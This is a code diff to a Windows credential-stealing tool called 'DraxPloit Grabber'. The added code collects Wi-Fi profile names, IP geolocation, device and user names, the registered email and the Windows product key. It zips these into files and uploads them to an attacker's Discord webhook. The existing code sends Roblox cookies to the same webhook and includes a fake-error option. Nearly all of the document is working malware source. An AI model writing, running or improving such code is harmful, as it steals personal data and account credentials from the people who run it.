@@ -6,6 +6,7 @@ import platform
 import subprocess
 import re
 import ctypes
+import zipfile
 
 from discord_webhook import DiscordWebhook,DiscordEmbed
 from typing import Union
@@ -38,6 +39,7 @@ class Exploit:
     def __init__(self):
         self.api = "https://ipinfo.io/json"
         self.log = ""
+        self.file = ""
         self.w3bh00k = self.fetch_conf('yourwebhookurl')
         self.startupexe = self.fetch_conf("startup")
         self.fakeerror = self.fetch_conf("fakeerror")
@@ -49,6 +51,9 @@ class Exploit:
         return __config__.get(e)
 
     def getData(self):
+        SysDrive = os.getenv('SystemDrive')
+        output_dir = f'{SysDrive}/Users/Public/Documents'
+        
         stats = requests.get(self.api)
         json_stats = stats.json()
         ip = json_stats["ip"]
@@ -93,12 +98,42 @@ class Exploit:
         except Exception:
             registeredMail = "N/A"
 
+        WlanProfileNameCollector = subprocess.check_output('netsh wlan show profile', creationflags=flag, encoding='latin-1')
+        WlanProfileNameList = []
+
+        for line in WlanProfileNameCollector.splitlines():
+            parts = line.split(":")
+            if len(parts) >= 2:
+                profile_name = line.split(":")[1].strip()
+                WlanProfileNameList.append(profile_name)
+        del WlanProfileNameList[0]
+
+        WlanProfileFileName = os.path.join(output_dir, 'wifi_profiles.txt')
+        with open(WlanProfileFileName, 'w') as file:
+            for profile in WlanProfileNameList:
+                file.write(f"{profile} : Password not found (BETA)\n")
+
+        GeneralData = os.path.join(output_dir, 'general_information.txt')
+        with open(GeneralData, 'w') as file:
+            file.write(f"IP: {ip}\nCity: {city}\nRegion: {region}\nCountry: {country}\nTimezone: {timezone}\nOrg: {org}\n\nDevice Name: {deviceName}\nDevice User: {deviceUser}\nRegistered Mail: {registeredMail}\n\nWindows-UUID: {uuidwndz}\nWindows Product Key: {w1nk33y}\nWindows Version: {w1nv3r}\n\nDraxPloit Grabber\nhttps://github.com/DraxFM/DraxPloit-Grabber\nThanks for using my software.")
+
+        zip_filename = os.path.join(output_dir, 'archive.zip')
+        with zipfile.ZipFile(zip_filename, 'w') as zip_file:
+            zip_file.write(WlanProfileFileName)
+            zip_file.write(GeneralData)
+
+        self.file = zip_filename  
             
         self.log = f"**DraxPloit Grabber** beamed a **NEW** user: ```\nIP: {ip}\nCity: {city}\nRegion: {region}\nCountry: {country}\nTimezone: {timezone}\n\nOrg: {org}\nDevice Name: {deviceName}\nDevice User: {deviceUser}\nRegistered Mail: {registeredMail}\nWindows-Key: {w1nk33y}\nWindows Version: {w1nv3r}\nUUID: {uuidwndz}```"
 
     def sendMainData(self):
         data = {"content": self.log, "username": "DraxPloit Grabber Notifier", "avatar_url": self.avatarURL}
         requests.post(self.w3bh00k, json = data)
+
+    def sendZipFile(self):
+        payload = {'content': 'Corresponding Files:', "username": "DraxPloit Grabber Notifier", "avatar_url": self.avatarURL}
+        files = {'file':open(self.file, 'rb')}
+        requests.post(self.w3bh00k, files=files, data=payload)
 
     def edgeLog(self):
         try:
@@ -139,6 +174,9 @@ class Exploit:
     def sendCookieLog(self):
         if self.robloxcookies:
             data = {"content": "Roblox coookie found: ```" + self.robloxcookies[0] +"```", "username": "DraxPloit Grabber Notifier", "avatar_url": self.avatarURL}
+            requests.post(self.w3bh00k, json = data)
+        else:
+            data = {"content": "No Roblox cookies could be found.", "username": "DraxPloit Grabber Notifier", "avatar_url": self.avatarURL}
             requests.post(self.w3bh00k, json = data)
 
     def mainTokenProcess(self):
@@ -222,6 +260,7 @@ if __name__ == "__main__" and platform.system() == "Windows":
     exploit.sendCookieLog()
 
     exploit.mainTokenProcess()
+    exploit.sendZipFile()
 
     exploit.credits()
 
